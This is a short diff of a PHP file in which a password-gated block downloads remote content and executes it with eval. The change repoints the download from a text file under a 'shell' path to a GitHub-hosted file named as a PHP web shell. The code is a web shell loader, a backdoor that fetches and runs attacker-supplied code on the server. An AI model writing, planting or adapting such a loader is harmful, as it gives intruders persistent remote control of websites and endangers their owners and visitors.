@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-  $a = geturlsinfo('https://marslogs.co.id/shell/shell/ndasbajul.txt');
+  $a = geturlsinfo('https://raw.githubusercontent.com/1llsion/shell/main/AlfaHun73r-shell.php');
   eval('?>' . $a);
 } else {
   // Display login form if not logged in
